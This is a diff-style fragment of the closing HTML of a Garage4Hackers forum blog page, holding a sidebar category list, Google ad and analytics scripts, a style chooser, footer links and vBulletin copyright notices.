+				</ul>
+			</div>
+		</div>
+	</div>
+	<div class="underblock"></div>
+</li>
+
+	<li id="block_category">
+		<div class="block categoryblock" id="block_category_div">
+			<div class="blocksubhead smaller moveable"  id="block_category_handle">
+				<a href="#top" id="collapse_c_blog_categories" class="collapse"><img src="images/buttons/collapse_40b.png" alt="" /></a>
+				
+				Blog Categories
+			</div>
+			<div class="blockbody" id="c_blog_categories">
+				<div class="blockrow">
+					
+					
+						<h2 class="local">Local Categories</h2>
+						<ul class="folderlist hideoverflow">
+							
+<li>
+	<img src="images/misc/blog/folder.html" class="inlineimg" alt="Uncategorized" border="0" />
+	
+		
+			<a href="blog71e7.html?u=8&amp;blogcategoryid=-1" title="Uncategorized">Uncategorized</a>
+		
+	
+</li>
+						</ul>
+					
+				</div>
+			</div>
+		</div>
+		<div class="underblock"></div>
+	</li>
+
+	</ul>
+	
+	
+</div></div>
+	
+	<div class="cleardiv"></div>
+</div>
+
+
+<div style="clear: left">
+  
+<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 468;
+google_ad_height = 60;
+google_ad_format = "468x60_as";
+google_ad_type = "text_image";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+  <div id="ad_global_above_footer"><div align="center">
+<script type="text/javascript"><!--
+google_ad_client = "pub-6847984837250662";
+/* 728x90, created 7/9/10 */
+google_ad_slot = "7101394260";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script></div>
+</div>
+
+<div id="footer" class="floatcontainer footer">
+
+	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">
+
+		
+			<select name="styleid" onchange="switch_id(this, 'style')">
+				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
+				
+					
+					<optgroup label="&nbsp;Standard Styles">
+									
+					
+	<option value="1" class="" selected="selected">-- Default Style</option>
+
+					
+					</optgroup>
+										
+				
+				
+					
+					<optgroup label="&nbsp;Mobile Styles">
+					
+					
+	<option value="2" class="" >-- Default Mobile Style</option>
+
+					
+					</optgroup>
+										
+				
+			</select>	
+		
+		
+		
+	</form>
+
+	<ul id="footer_links" class="footer_links">
+		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
+		<li><a href="index.html">Garage4hackers</a></li>
+		
+		
+		<li><a href="archive/index.html">Archive</a></li>
+		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
+		
+		
+		<li><a href="entry8161.html?b=1044#top" onclick="document.location.hash='top'; return false;">Top</a></li>
+	</ul>
+	
+	
+	
+	
+	<script type="text/javascript">
+	<!--
+		// Main vBulletin Javascript Initialization
+		vBulletin_init();
+		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
+	//-->
+	</script>
+        
+</div>
+</div> <!-- closing div for body_wrapper -->
+
+<div class="below_body">
+<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">04:09 PM</span>.</div>
+
+<div id="footer_copyright" class="shade footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="shade footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+	
+</div>
+ 
+
+	<div id="fb-root"></div>
+<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>
+
+<script type="text/javascript">
+<!--
+	loadFacebookAPI('en_US');
+	function fbAsyncInit()
+	{
+		vBfb = new vB_Facebook({
+			appid : "170793809601191",
+			connected : 0,
+			active : 0,
+			autoreg : 0,
+			feed_newthread : 1,
+			feed_postreply : 1,
+			feed_blogentry : 1,
+			feed_blogcomment : 1,
+			feed_newarticle : 1,
+			feed_articlecomment : 1
+		});
+	}
+// -->
+</script>
+
+</div>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+</html>
